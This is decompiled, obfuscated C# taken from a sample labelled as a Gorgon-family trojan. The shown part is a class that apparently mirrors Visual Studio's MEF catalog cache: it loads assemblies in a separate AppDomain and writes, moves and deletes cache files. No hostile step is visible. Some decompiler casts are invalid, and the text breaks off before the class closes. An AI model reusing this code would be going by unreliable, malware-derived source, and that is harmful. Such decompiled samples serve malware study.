// Decompiled with JetBrains decompiler
// Type: 7MvlnZW.bmWbPt6
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u0030foHdXo;
using \u0032DVyudQ;
using \u0034IerJKw;
using \u00366N2IhJ;
using \u0037MvlnZW;
using \u0037rV4tMC;
using Ar8hHmr;
using jWEwPnv;
using jz0haJe;
using li9OdoS;
using R4qHaNR;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel.Composition.Hosting;
using System.ComponentModel.Composition.Primitives;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Policy;
using U8zsCil;
using ZG8dgzB;
using ZuqPiTm;

namespace \u0037MvlnZW
{
  public sealed class bmWbPt6
  {
    private const string \u0035dphfPZ = "MEF Catalog Cache Domain";
    private bmWbPt6.jyyz3jf AgvQwex;
    private const string Y9EyDVP = "Pending";
    private const string \u0033hmzTRC = ".delete";
    private const string n9QrK0P = ".Override";
    private const string YO2oNeB = ".cache";
    private const string \u00315WQ3aa = "Updated";
    private const string tZZaHHl = "Microsoft.VisualStudio.Default";
    private const string LBqR22V = "Microsoft.VisualStudio.Editor";
    private jUU2Be4 LTJdS9q;
    private ConcurrentDictionary<string, zINRWpL> QVBCo6i = new ConcurrentDictionary<string, zINRWpL>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    private Dictionary<string, List<string>> c9OameH;
    private object Yv7ww2E = new object();
    private string \u00361JHibz;
    private bool lThdXbb;
    private List<string> \u0032a7nWwJ;
    private HashSet<string> j62mS00 = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    private HashSet<string> \u0033P7feCJ = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    private HashSet<string> hnvCAyf = new HashSet<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);

    internal bmWbPt6.jyyz3jf \u0034DyOaNh
    {
      get
      {
        if (this.AgvQwex == null)
          this.AgvQwex = (bmWbPt6.jyyz3jf) new bmWbPt6.Sq6ZTAc(this);
        return this.AgvQwex;
      }
    }

    private zINRWpL HdkTlur(string i4dGP23, IEnumerable<string> nVkSDJD, bool iAck9NB = false)
    {
      zINRWpL zInrWpL;
      lock (this.Yv7ww2E)
      {
        if (!this.QVBCo6i.TryGetValue(i4dGP23, out zInrWpL))
        {
          IEnumerable<string> allAssemblies = iAck9NB ? nVkSDJD : this.MMTjoeG;
          zInrWpL = new zINRWpL(nVkSDJD, this.LTJdS9q, allAssemblies);
          this.QVBCo6i[i4dGP23.ToUpperInvariant()] = zInrWpL;
        }
      }
      return zInrWpL;
    }

    private bool HgZpd3P(
      string[] L85BEjv,
      out List<Tuple<\u0037jxjFzS, string, string>> _param2)
    {
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.WdNGdzk wdNgdzk = (bmWbPt6.WdNGdzk) new bmWbPt6.jyyz3jf();
      ((bmWbPt6.jyyz3jf) wdNgdzk).gAdxWFU = this;
      // ISSUE: reference to a compiler-generated field
      wdNgdzk.o4Kjgov = L85BEjv;
      _param2 = new List<Tuple<\u0037jxjFzS, string, string>>();
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      return wdNgdzk.o4Kjgov != null && wdNgdzk.o4Kjgov.Length != 0 && this.LBds2sy(new Func<bmWbPt6.wNFdViw, bool>(wdNgdzk.Odhgmmf), out _param2);
    }

    private bool LBds2sy(
      Func<bmWbPt6.wNFdViw, bool> S5g2qFN,
      out List<Tuple<\u0037jxjFzS, string, string>> IK7m5tP)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.CJCtVZt cjCtVzt = (bmWbPt6.CJCtVZt) new bmWbPt6.WdNGdzk();
      // ISSUE: reference to a compiler-generated field
      ((bmWbPt6.WdNGdzk) cjCtVzt).fEbcbfR = this;
      IK7m5tP = new List<Tuple<\u0037jxjFzS, string, string>>();
      bool flag = false;
      try
      {
        // ISSUE: reference to a compiler-generated field
        cjCtVzt.CkQn6Qx = AppDomain.CreateDomain("MEF Catalog Cache Domain", (Evidence) null, new AppDomainSetup()
        {
          LoaderOptimization = LoaderOptimization.SingleDomain
        });
        // ISSUE: reference to a compiler-generated field
        bmWbPt6.wNFdViw instanceAndUnwrap = (bmWbPt6.wNFdViw) cjCtVzt.CkQn6Qx.CreateInstanceAndUnwrap(typeof (bmWbPt6.wNFdViw).Assembly.FullName, typeof (bmWbPt6.wNFdViw).FullName);
        flag = S5g2qFN(instanceAndUnwrap);
        IK7m5tP = this.\u0034DyOaNh.h3Yfdgm;
        // ISSUE: reference to a compiler-generated method
        new Action(cjCtVzt.p9BYAjz).BeginInvoke((AsyncCallback) null, (object) null);
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.LTJdS9q, ex, string.Empty);
        throw;
      }
      finally
      {
        this.AgvQwex = (bmWbPt6.jyyz3jf) null;
      }
      return flag;
    }

    private bool gzxNBVJ(
      string i1GnurA,
      out List<Tuple<\u0037jxjFzS, string, string>> _param2)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.s0s0OuI s0s0OuI = (bmWbPt6.s0s0OuI) new bmWbPt6.sJmofnJ();
      // ISSUE: reference to a compiler-generated field
      ((bmWbPt6.sJmofnJ) s0s0OuI).tcUKFmQ = this;
      // ISSUE: reference to a compiler-generated field
      s0s0OuI.xqUkmJ4 = i1GnurA;
      _param2 = new List<Tuple<\u0037jxjFzS, string, string>>();
      // ISSUE: reference to a compiler-generated method
      return this.LBds2sy(new Func<bmWbPt6.wNFdViw, bool>(s0s0OuI.w0u0AUZ), out _param2);
    }

    public ComposablePartCatalog HQS5hMc(string BlozZnj, bool bKVqaxE = true)
    {
      ComposablePartCatalog eG62Jjq;
      if (!this.H55wP5E(BlozZnj, out eG62Jjq))
      {
        lock (this.Yv7ww2E)
        {
          eG62Jjq = (ComposablePartCatalog) this.ewGw858(BlozZnj);
          if (eG62Jjq == null)
          {
            if (!bKVqaxE)
              throw new Exception(MykOU9k.wpx65vA);
            eG62Jjq = (ComposablePartCatalog) this.R72T8Tv(BlozZnj);
          }
          this.QVBCo6i[BlozZnj.ToUpperInvariant()] = (zINRWpL) eG62Jjq;
        }
      }
      return eG62Jjq;
    }

    public CompositionScopeDefinition \u0033v8uftJ(
      ComposablePartCatalog CaXjDaG)
    {
      return CaXjDaG is zINRWpL ? ((zINRWpL) CaXjDaG).G1Hcxpy : throw new ArgumentException(MykOU9k.QA7dFY7);
    }

    private static Stream Fvc5p9u(string NyKlF2B)
    {
      using (File.Open(NyKlF2B, FileMode.Create, FileAccess.ReadWrite, FileShare.Read))
        return (Stream) File.Open(NyKlF2B, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
    }

    private static string hghoRDu(string W4EUeXN) => W4EUeXN + "." + Process.GetCurrentProcess().Id.ToString((IFormatProvider) CultureInfo.InvariantCulture);

    private zINRWpL ewGw858(string MfLqOPy)
    {
      zINRWpL zInrWpL;
      if (!this.DkmFMKw(MfLqOPy, true, out zInrWpL))
        zInrWpL = this.kKLqI8H(MfLqOPy);
      return zInrWpL;
    }

    private bool DkmFMKw(string ychD9Nd, bool JraYS88, out zINRWpL _param3)
    {
      _param3 = (zINRWpL) null;
      if (!this.HdYZ1hj(ychD9Nd, out _param3))
        return false;
      bool y1I1pGh = false;
      zINRWpL zInrWpL = (zINRWpL) null;
      ICollection<string> strings;
      if (_param3.zXFMmli)
      {
        string[] array = _param3.RexmPIN(this.MMTjoeG).ToArray<string>();
        HashSet<string> joao4Ep;
        IList<string> xn2ZQwS;
        this.gusT2Ch(this.\u0035iQGQxL(_param3), this.MMTjoeG, out joao4Ep, out xn2ZQwS);
        if (array.Length != 0)
        {
          y1I1pGh = true;
          if (JraYS88)
            zInrWpL = this.Z9okd9l(ychD9Nd, array);
          else if (!this.\u0032CeVA6K(bmWbPt6.hghoRDu(ychD9Nd + ".Override"), this.VxoQBGF("Pending"), true, out zInrWpL))
            zInrWpL = (zINRWpL) null;
          joao4Ep.ExceptWith((IEnumerable<string>) array);
          if (zInrWpL != null)
            joao4Ep.UnionWith(this.\u0035iQGQxL(zInrWpL));
          else
            joao4Ep.UnionWith(this.sbm1lRl(ychD9Nd, _param3, out y1I1pGh));
        }
        y1I1pGh |= xn2ZQwS.Count != 0;
        strings = (ICollection<string>) joao4Ep;
      }
      else
        strings = (ICollection<string>) this.\u0035iQGQxL(_param3).ToArray<string>();
      _param3.lXBVFOs((IEnumerable<string>) strings, this.LTJdS9q, y1I1pGh, zInrWpL);
      return true;
    }

    private void gusT2Ch(
      IEnumerable<string> Y1ZKpmx,
      IEnumerable<string> _param2,
      out HashSet<string> joao4Ep,
      out IList<string> xn2ZQwS)
    {
      xn2ZQwS = (IList<string>) new List<string>();
      HashSet<string> stringSet = new HashSet<string>(_param2, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      foreach (string str in Y1ZKpmx)
      {
        if (!stringSet.Contains(str))
          xn2ZQwS.Add(str);
      }
      stringSet.IntersectWith(Y1ZKpmx);
      joao4Ep = stringSet;
    }

    private zINRWpL Z9okd9l(string HABiN3N, string[] otRieGH)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.VYgob4i vygob4i = (bmWbPt6.VYgob4i) new bmWbPt6.s0s0OuI();
      // ISSUE: reference to a compiler-generated field
      ((bmWbPt6.s0s0OuI) vygob4i).AA7mlDx = this;
      // ISSUE: reference to a compiler-generated field
      vygob4i.\u0039h9u0Ln = HABiN3N;
      // ISSUE: reference to a compiler-generated field
      vygob4i.zUyCnVJ = otRieGH;
      // ISSUE: reference to a compiler-generated field
      vygob4i.\u0039h9u0Ln += ".Override";
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      return this.mdYHjSL((bmWbPt6.Sq6ZTAc) new bmWbPt6.wNFdViw(vygob4i.\u0039h9u0Ln, new Func<bmWbPt6.wNFdViw, bool>(vygob4i.n9VVB7O), false));
    }

    private zINRWpL kKLqI8H(string pqmjaZZ)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.EiirmQk eiirmQk = (bmWbPt6.EiirmQk) new bmWbPt6.VYgob4i();
      // ISSUE: reference to a compiler-generated field
      ((bmWbPt6.VYgob4i) eiirmQk).PhgkhAu = this;
      // ISSUE: reference to a compiler-generated field
      eiirmQk.BmJ6VPw = pqmjaZZ;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated method
      return this.mdYHjSL((bmWbPt6.Sq6ZTAc) new bmWbPt6.wNFdViw(eiirmQk.BmJ6VPw, new Func<bmWbPt6.wNFdViw, bool>(eiirmQk.DDFfP3U)));
    }

    private zINRWpL mdYHjSL(bmWbPt6.Sq6ZTAc lmBuWwe)
    {
      this.xvRfzrP();
      BeWDuY7 mFmgixz;
      if (this.TxcpPhA(lmBuWwe, out mFmgixz))
      {
        long bOkzGgf;
        if (mFmgixz.SerHCqX(out bOkzGgf))
        {
          try
          {
            mFmgixz.XUQjNqj = new bool?(true);
            zINRWpL iMfh4yb = mFmgixz.pSkaM0w(bOkzGgf);
            iMfh4yb.lXBVFOs(this.\u0035iQGQxL(iMfh4yb), this.LTJdS9q, false);
            return iMfh4yb;
          }
          finally
          {
            mFmgixz.XUQjNqj = new bool?();
          }
        }
      }
      return (zINRWpL) null;
    }

    private IEnumerable<string> \u0035iQGQxL(zINRWpL iMfh4yb) => iMfh4yb.ogiBu2C.Select<YkBa6Sd, string>((Func<YkBa6Sd, string>) (o53OBpW => o53OBpW.CoHpFeR));

    private bool TxcpPhA(bmWbPt6.Sq6ZTAc h7s9rD8, out BeWDuY7 mFmgixz)
    {
      string W4EUeXN = h7s9rD8.\u00324M12W1;
      string str1 = this.VxoQBGF("Pending");
      string str2 = Path.Combine(this.\u00361JHibz, W4EUeXN + ".cache");
      string str3 = Path.Combine(str1, bmWbPt6.hghoRDu(W4EUeXN) + ".cache");
      mFmgixz = (BeWDuY7) null;
      try
      {
        this.xvRfzrP();
        Directory.CreateDirectory(str1);
        using (bmWbPt6.Fvc5p9u(str3))
        {
          List<Tuple<\u0037jxjFzS, string, string>> IK7m5tP = new List<Tuple<\u0037jxjFzS, string, string>>();
          bool flag = this.LBds2sy(h7s9rD8.y4yuUdi, out IK7m5tP);
          if (IK7m5tP != null)
          {
            foreach (Tuple<\u0037jxjFzS, string, string> tuple in IK7m5tP)
              this.LTJdS9q.\u00340C4Zbq(tuple.Item1, tuple.Item2, tuple.Item3);
          }
          if (!flag)
            return false;
          mFmgixz = new BeWDuY7(str3, this.LTJdS9q);
        }
        if (h7s9rD8.euQ14TD)
        {
          try
          {
            string destFileName = this.P52IuMn(W4EUeXN);
            if (File.Exists(str2))
              File.Move(str2, destFileName);
            File.Move(str3, str2);
            mFmgixz.cWEX9Il = str2;
          }
          catch (IOException ex)
          {
            U1j2scS.CJDYFbi(this.LTJdS9q, (Exception) ex, str2);
          }
        }
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.LTJdS9q, ex, str3);
        return false;
      }
      return true;
    }

    public bmWbPt6(jUU2Be4 componentModelHost)
    {
      this.LTJdS9q = componentModelHost != null ? componentModelHost : throw new ArgumentNullException(nameof (componentModelHost));
      this.\u00361JHibz = this.LTJdS9q.e1NwWY8;
    }

    public bool KE6Ib4m
    {
      get
      {
        lock (this.Yv7ww2E)
          return this.QVBCo6i.Any<KeyValuePair<string, zINRWpL>>((Func<KeyValuePair<string, zINRWpL>, bool>) (dvgtpYV => !this.j62mS00.Contains<string>(dvgtpYV.Key, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase) && !dvgtpYV.Value.hZ7CbWz));
      }
    }

    private IEnumerable<string> MMTjoeG
    {
      get
      {
        if (this.\u0032a7nWwJ == null)
        {
          List<string> stringList = new List<string>();
          foreach (string str in this.LTJdS9q.Z2CqXBk.Distinct<string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase))
          {
            try
            {
              \u0036HFRYLK.fe05rpM(str);
              stringList.Add(str);
            }
            catch (Exception ex)
            {
              U1j2scS.CJDYFbi(this.LTJdS9q, ex, str);
            }
          }
          this.\u0032a7nWwJ = stringList;
        }
        return (IEnumerable<string>) this.\u0032a7nWwJ;
      }
    }

    public ComposablePartCatalog LlxOcRS(string _param1)
    {
      ComposablePartCatalog eG62Jjq;
      if (!this.H55wP5E(_param1, out eG62Jjq))
      {
        lock (this.Yv7ww2E)
        {
          eG62Jjq = (ComposablePartCatalog) this.R72T8Tv(_param1);
          this.QVBCo6i[_param1.ToUpperInvariant()] = (zINRWpL) eG62Jjq;
        }
      }
      return eG62Jjq;
    }

    public bool H55wP5E(string KvmFWUJ, out ComposablePartCatalog eG62Jjq)
    {
      if (KvmFWUJ == null)
        throw new ArgumentNullException("catalogName");
      if (string.IsNullOrEmpty(KvmFWUJ))
        throw new ArgumentException(MykOU9k.ILajnEP);
      zINRWpL zInrWpL;
      int num = this.QVBCo6i.TryGetValue(KvmFWUJ, out zInrWpL) ? 1 : 0;
      eG62Jjq = (ComposablePartCatalog) zInrWpL;
      return num != 0;
    }

    public bool LVf9Kor()
    {
      lock (this.Yv7ww2E)
        return this.QVBCo6i.Where<KeyValuePair<string, zINRWpL>>((Func<KeyValuePair<string, zINRWpL>, bool>) (AWhXXx3 => !this.j62mS00.Contains<string>(AWhXXx3.Key, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase) && !AWhXXx3.Value.hZ7CbWz)).Select<KeyValuePair<string, zINRWpL>, bool>((Func<KeyValuePair<string, zINRWpL>, bool>) (oYeh7Zt => this.REh78Ko(oYeh7Zt.Key, oYeh7Zt.Value))).All<bool>((Func<bool, bool>) (_param1 => _param1));
    }

    public bool QV8Khsd(
      out List<Tuple<\u0037jxjFzS, string, string>> Ne6GsqL)
    {
      lock (this.Yv7ww2E)
        return this.HgZpd3P(this.QVBCo6i.Where<KeyValuePair<string, zINRWpL>>((Func<KeyValuePair<string, zINRWpL>, bool>) (WrWTKde => this.j62mS00.Add(WrWTKde.Key) && !WrWTKde.Value.hZ7CbWz)).Select<KeyValuePair<string, zINRWpL>, string>((Func<KeyValuePair<string, zINRWpL>, string>) (CKXwxFq => CKXwxFq.Key)).ToArray<string>(), out Ne6GsqL);
    }

    private zINRWpL R72T8Tv(string NRkvZ3H)
    {
      zINRWpL XZJX6g0;
      if (!this.HdYZ1hj(NRkvZ3H, out XZJX6g0))
      {
        XZJX6g0 = new zINRWpL(this.zjs5hyQ(NRkvZ3H), this.LTJdS9q, this.MMTjoeG);
      }
      else
      {
        bool y1I1pGh;
        XZJX6g0.lXBVFOs(this.sbm1lRl(NRkvZ3H, XZJX6g0, out y1I1pGh), this.LTJdS9q, y1I1pGh);
      }
      return XZJX6g0;
    }

    private IEnumerable<string> zjs5hyQ(string RgtP4Gt)
    {
      this.QBim8pi();
      List<string> Hfbe2Wk;
      if (!this.c9OameH.TryGetValue(RgtP4Gt, out Hfbe2Wk))
        Hfbe2Wk = new List<string>();
      return this.t03qVgI((IEnumerable<string>) Hfbe2Wk);
    }

    private bool MW6kFSP(string MhZMaLj, string uAFXZSv)
    {
      List<string> p8qdpZJ;
      return this.zF0Zmge(uAFXZSv, out Assembly _, out p8qdpZJ) && p8qdpZJ.Contains(MhZMaLj);
    }

    private void QBim8pi()
    {
      if (this.c9OameH != null)
        return;
      Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      foreach (string AxMuMIb in this.MMTjoeG)
      {
        List<string> p8qdpZJ;
        if (this.zF0Zmge(AxMuMIb, out Assembly _, out p8qdpZJ))
        {
          foreach (string key in p8qdpZJ)
          {
            List<string> stringList;
            if (!dictionary.TryGetValue(key, out stringList))
            {
              stringList = new List<string>();
              dictionary[key.ToUpperInvariant()] = stringList;
            }
            stringList.Add(AxMuMIb);
          }
        }
      }
      this.c9OameH = dictionary;
    }

    private bool zF0Zmge(string AxMuMIb, out Assembly ht8zIrM, out List<string> p8qdpZJ)
    {
      ht8zIrM = (Assembly) null;
      p8qdpZJ = new List<string>();
      try
      {
        AssemblyName assemblyName = AssemblyName.GetAssemblyName(AxMuMIb);
        ht8zIrM = Assembly.Load(assemblyName);
        foreach (DqEqXnT customAttribute in ht8zIrM.GetCustomAttributes(typeof (DqEqXnT), false))
        {
          if (customAttribute.EJwWaC4.Equals("Microsoft.VisualStudio.Editor", StringComparison.OrdinalIgnoreCase))
            p8qdpZJ.Add("Microsoft.VisualStudio.Default");
          else
            p8qdpZJ.Add(customAttribute.EJwWaC4);
        }
        if (p8qdpZJ.Count == 0)
          p8qdpZJ.Add("Microsoft.VisualStudio.Default");
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.LTJdS9q, ex, AxMuMIb);
        return false;
      }
      return true;
    }

    private void xvRfzrP()
    {
      if (this.lThdXbb)
        return;
      try
      {
        string path = this.VxoQBGF("Pending");
        Directory.CreateDirectory(path);
        foreach (string enumerateFile in Directory.EnumerateFiles(path))
        {
          try
          {
            using (new FileStream(enumerateFile, FileMode.Open, FileAccess.Write, FileShare.None, 1, FileOptions.DeleteOnClose))
              ;
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      this.lThdXbb = true;
    }

    private string P52IuMn(string _param1)
    {
      this.xvRfzrP();
      return Path.Combine(this.VxoQBGF("Pending"), _param1 + "." + Path.GetRandomFileName() + ".delete");
    }

    private bool HdYZ1hj(string gvBDzx5, out zINRWpL XZJX6g0) => this.\u0032CeVA6K(gvBDzx5, this.\u00361JHibz, false, out XZJX6g0);

    private bool \u0032CeVA6K(string YWIy5Bd, string IsvkZix, bool FQwdvGQ, out zINRWpL _param4)
    {
      _param4 = (zINRWpL) null;
      string str1 = Path.Combine(IsvkZix, YWIy5Bd + ".cache");
      BeWDuY7 beWduY7 = (BeWDuY7) null;
      try
      {
        if (!FQwdvGQ)
        {
          string str2 = Path.Combine(Path.Combine(this.\u00361JHibz, "Updated"), YWIy5Bd + ".cache");
          if (File.Exists(str2))
          {
            try
            {
              if (File.Exists(str1))
                File.Move(str1, this.P52IuMn(YWIy5Bd));
              File.Move(str2, str1);
            }
            catch (IOException ex)
            {
              U1j2scS.CJDYFbi(this.LTJdS9q, (Exception) ex, str1);
            }
          }
        }
        if (!File.Exists(str1))
          return false;
        beWduY7 = new BeWDuY7(str1, this.LTJdS9q);
        long bOkzGgf;
        if (!beWduY7.SerHCqX(out bOkzGgf))
        {
          beWduY7.OR9I5k2();
          this.LTJdS9q.\u00340C4Zbq(\u0037jxjFzS.Warning, MykOU9k.\u0032t2D2jc, str1);
          return false;
        }
        _param4 = beWduY7.pSkaM0w(bOkzGgf);
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.LTJdS9q, ex, str1);
        beWduY7?.OR9I5k2();
        return false;
      }
      finally
      {
        this.xvRfzrP();
      }
      return true;
    }

    private IEnumerable<string> sbm1lRl(
      string v5Fa0JV,
      zINRWpL lkxnAcQ,
      out bool y1I1pGh)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      bmWbPt6.b8dO6Zj b8dO6Zj = (bmWbPt6.b8dO6Zj) new bmWbPt6.OpMpyg3();
      // ISSUE: reference to a compiler-generated field
      ((bmWbPt6.OpMpyg3) b8dO6Zj).H95azZN = v5Fa0JV;
      IEnumerable<YkBa6Sd> ogiBu2C = (IEnumerable<YkBa6Sd>) lkxnAcQ.ogiBu2C;
      if (!lkxnAcQ.zXFMmli)
      {
        y1I1pGh = false;
        return (IEnumerable<string>) ogiBu2C.Select<YkBa6Sd, string>((Func<YkBa6Sd, string>) (DJkyMHE => DJkyMHE.CoHpFeR)).ToArray<string>();
      }
      IList<string> list = (IList<string>) lkxnAcQ.RexmPIN(this.MMTjoeG).ToList<string>();
      y1I1pGh = list.Count > 0;
      List<string> Hfbe2Wk = new List<string>();
      foreach (string str in (IEnumerable<string>) list)
      {
        List<string> p8qdpZJ;
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated method
        if (this.zF0Zmge(str, out Assembly _, out p8qdpZJ) && p8qdpZJ.Any<string>(b8dO6Zj.e8Sruh3 ?? (b8dO6Zj.e8Sruh3 = new Func<string, bool>(b8dO6Zj.bCnHlUK))))
        {
          Hfbe2Wk.Add(str);
          this.LTJdS9q.\u00340C4Zbq(\u0037jxjFzS.Warning, "Component assembly is new or has been updated", str);
        }
      }
      return this.t03qVgI((IEnumerable<string>) Hfbe2Wk).Concat<string>(this.MMTjoeG.Intersect<string>(ogiBu2C.Select<YkBa6Sd, string>((Func<YkBa6Sd, string>) (IgRBOSR => IgRBOSR.CoHpFeR)), (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase).Except<string>((IEnumerable<string>) list, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase));
    }

    private bool REh78Ko(string u8WtDNz, zINRWpL ns0i1sy) => this.IgQ8F9i(u8WtDNz, ns0i1sy, "Updated", u8WtDNz);

    private bool IgQ8F9i(
      string iSvDCK3,
      zINRWpL kxOF4aV,
      string KchAXgQ,
      string iXK56qp,
      FileShare BSCnoNN = FileShare.None)
    {
      bool flag = true;
      string str1 = this.VxoQBGF(KchAXgQ);
      string str2 = Path.Combine(str1, iXK56qp + ".cache");
      try
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        bmWbPt6.yFxFch2 yFxFch2 = (bmWbPt6.yFxFch2) new bmWbPt6.b8dO6Zj();
        Directory.CreateDirectory(str1);
        // ISSUE: reference to a compiler-generated field
        ((bmWbPt6.b8dO6Zj) yFxFch2).ZbFKidd = new HashSet<string>(this.MMTjoeG, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
        // ISSUE: reference to a compiler-generated method
        YkBa6Sd[] array = kxOF4aV.ogiBu2C.Concat<YkBa6Sd>((IEnumerable<YkBa6Sd>) kxOF4aV.k5AhiAC).Where<YkBa6Sd>(new Func<YkBa6Sd, bool>(yFxFch2.W3SAdTz)).ToArray<YkBa6Sd>();
        new qjPLF0w(str2, kxOF4aV, (IEnumerable<YkBa6Sd>) array, this.LTJdS9q).t1iJpQy(BSCnoNN);
        this.LTJdS9q.\u00340C4Zbq(\u0037jxjFzS.Information, string.Format((IFormatProvider) CultureInfo.InvariantCulture, "Successfully created cache for '{0}' catalog", (object) iSvDCK3), str2);
      }
      catch (Exception ex)
      {
        U1j2scS.CJDYFbi(this.LTJdS9q, ex, str2);
        flag = false;
      }
      this.j62mS00.Add(iSvDCK3);
      return flag;
    }

    private string VxoQBGF(string _param1) => Path.Combine(this.\u00361JHibz, _param1);

    private IEnumerable<string> t03qVgI(IEnumerable<string> Hfbe2Wk)
    {
      IEnumerable<IGrouping<bool, string>> source = Hfbe2Wk.GroupBy<string, bool>((Func<string, bool>) (qQzuz4q => this.\u0033P7feCJ.Contains(qQzuz4q)));
      IEnumerable<string> array = (IEnumerable<string>) source.Where<IGrouping<bool, string>>((Func<IGrouping<bool, string>, bool>) (LvXjLoH => !LvXjLoH.Key)).SelectMany<IGrouping<bool, string>, string>((Func<IGrouping<bool, string>, IEnumerable<string>>) (vvks50M => (IEnumerable<string>) vvks50M)).Where<string>((Func<string, bool>) (bD5LeMF => !this.hnvCAyf.Contains(bD5LeMF))).ToArray<string>();
      IEnumerable<string> first = source.Where<IGrouping<bool, string>>((Func<IGrouping<bool, string>, bool>) (YcsrJIf => YcsrJIf.Key)).SelectMany<IGrouping<bool, string>, string>((Func<IGrouping<bool, string>, IEnumerable<string>>) (_param1 => (IEnumerable<string>) _param1));
      IEnumerable<string> strings = this.LTJdS9q.oNBjgDM(array);
      IEnumerable<string> second = strings;
      List<string> stringList = new List<string>(first.Concat<string>(second));
      this.\u0033P7feCJ.UnionWith(strings);
      this.hnvCAyf.UnionWith(array.Except<string>(strings, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase));
      return (IEnumerable<string>) stringList;
    }

    private class wNFdViw : MarshalByRefObject
    {
      public bool \u00363YHsCz(bmWbPt6.jyyz3jf Y1GSbdZ, string E9h1KlB, string[] DVrdGC2 = null)
      {
        try
        {
          // ISSUE: object of a compiler-generated type is created
          // ISSUE: variable of a compiler-generated type
          bmWbPt6.wNFdViw.y7j20h6 y7j20h6 = (bmWbPt6.wNFdViw.y7j20h6) new T5QzN9o.esjaQ4j.z9iOhDh();
          // ISSUE: reference to a compiler-generated field
          ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K = new bmWbPt6((jUU2Be4) new \u0038CwzXxX(Y1GSbdZ));
          bool iAck9NB = DVrdGC2 != null;
          IEnumerable<string> nVkSDJD;
          if (iAck9NB)
          {
            // ISSUE: reference to a compiler-generated field
            y7j20h6.GT2Qz3S = E9h1KlB.Substring(0, E9h1KlB.Length - ".Override".Length);
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated method
            nVkSDJD = (IEnumerable<string>) ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K.t03qVgI(((IEnumerable<string>) DVrdGC2).Where<string>(new Func<string, bool>(y7j20h6.mTwYyfX))).ToArray<string>();
          }
          else
          {
            // ISSUE: reference to a compiler-generated field
            nVkSDJD = ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K.zjs5hyQ(E9h1KlB);
          }
          // ISSUE: reference to a compiler-generated field
          zINRWpL kxOF4aV = ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K.HdkTlur(E9h1KlB, nVkSDJD, iAck9NB);
          // ISSUE: reference to a compiler-generated field
          ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K.xvRfzrP();
          // ISSUE: reference to a compiler-generated field
          return ((T5QzN9o.esjaQ4j.z9iOhDh) y7j20h6).vGCmg0K.IgQ8F9i(E9h1KlB, kxOF4aV, "Pending", bmWbPt6.hghoRDu(E9h1KlB), FileShare.Read);
        }
        catch
        {
          return false;
        }
      }

      public wNFdViw()
      {
      }

      public wNFdViw(string catalogName, Func<bmWbPt6.wNFdViw, bool> operation, bool moveToRoot = true)
      {
        ((bmWbPt6.Sq6ZTAc) this).\u00324M12W1 = catalogName;
        ((bmWbPt6.Sq6ZTAc) this).y4yuUdi = operation;
        ((bmWbPt6.Sq6ZTAc) this).euQ14TD = moveToRoot;
      }
    }

    private class Sq6ZTAc
    {
      private bmWbPt6 YkhyOY8;

      public string \u00324M12W1
      {
        get => ((U1j2scS.FWCA7oQ) this).aV3EiLQ;
        private set => ((U1j2scS.FWCA7oQ) this).aV3EiLQ = value;
      }

      public Func<bmWbPt6.wNFdViw, bool> y4yuUdi { get; private set; }

      public bool euQ14TD { get; private set; }

      public Sq6ZTAc(bmWbPt6 catalogProvider)
        : this()
      {
        this.YkhyOY8 = catalogProvider;
        ((bmWbPt6.jyyz3jf) this).\u00347ts5dI = catalogProvider.LTJdS9q;
        ((bmWbPt6.jyyz3jf) this).KaOq1jy = new List<Tuple<\u0037jxjFzS, string, string>>();
      }
    }

